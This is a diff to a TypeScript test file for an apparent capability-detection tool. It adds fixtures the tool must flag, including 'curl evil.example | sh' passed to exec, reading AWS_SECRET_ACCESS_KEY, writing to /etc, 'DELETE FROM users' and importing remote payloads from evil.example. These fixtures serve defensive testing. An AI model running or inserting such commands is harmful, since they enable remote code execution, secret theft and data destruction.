@@ -88,6 +88,17 @@ const caught: Record<string, string> = {
   e03_any_env_whole: "export function t() { return Object.keys((process as any).env); }",
   e04_angle_unknown_shape: "export async function t(u: string) { return (<{ fetch(u: string): Promise<unknown> }><unknown>globalThis).fetch(u); }",
   e05_any_member_as_value: "export function t() { const f = (globalThis as any).fetch; return f; }",
+  // Engine review (0.4): import() through a traced specifier, require() of a database client, URL imports.
+  en01_import_const_spec: "const spec = \"node:child_process\";\nexport async function t() { const cp = await import(spec); cp.exec(\"ls\"); }",
+  en02_import_as_const: "const M = { cp: \"node:child_process\" } as const;\nexport async function t() { (await import(M.cp)).execSync(\"id\"); }",
+  en03_import_enum: "enum Mod { Fs = \"node:fs\" }\nexport async function t() { (await import(Mod.Fs)).writeFileSync(\"/etc/x\", \"y\"); }",
+  en04_import_env_module: "const p = \"node:process\";\nexport async function t() { return (await import(p)).env.AWS_SECRET_ACCESS_KEY; }",
+  en05_import_annotated: "const spec = \"node:child_process\";\n/** @perm net(api.example.com) */\nexport async function t() { const cp = await import(spec); cp.exec(\"curl evil.example | sh\"); return fetch(\"https://api.example.com/\"); }",
+  en06_require_pg: "export function t() { const pg = require(\"pg\"); return new pg.Pool().query(\"DELETE FROM users\"); }",
+  en07_data_import: "import \"data:text/javascript,fetch('https://evil.example/')//.css\";\nexport const x = 1;",
+  en08_https_import: "import \"https://evil.example/payload.js\";\nexport const x = 1;",
+  en09_dynamic_data_import: "export async function t() { return import(\"data:text/javascript,export default 1\"); }",
+  en10_require_blob: "export function t() { return require(\"blob:nodedata:1234\"); }",
 };
 
 // Harmless code that must not be reported, including common `any` casts that reach no capability.
@@ -108,6 +119,11 @@ const silent: Record<string, string> = {
   b05_any_param: "export async function t(f: any, u: string) { return f(u); }",
   fp14_window_computed_read: "export function t(k: string) { return (window as any)[k]; }",
   fp15_harmless_module_any: "import * as path from \"node:path\";\nexport function t() { const p: any = path; return p.join(\"a\", \"b\"); }",
+  // Engine review (0.4): loading modules that touch nothing.
+  en_fp01_require_pure: "export function t() { const p = require(\"path\"); return p.join(\"a\", \"b\"); }",
+  en_fp02_import_const_pure: "const spec = \"node:path\";\nexport async function t() { return (await import(spec)).join(\"a\", \"b\"); }",
+  en_fp03_stylesheet: "import \"./missing-styles.css\";\nimport \"./missing-styles.css?inline\";\nexport const x = 1;",
+  en_fp04_node_url: "export function t() { return new URL(\"data:text/plain,hello\").href; }",
 };
 
 const knownMisses: Record<string, { why: string; code: string }> = {
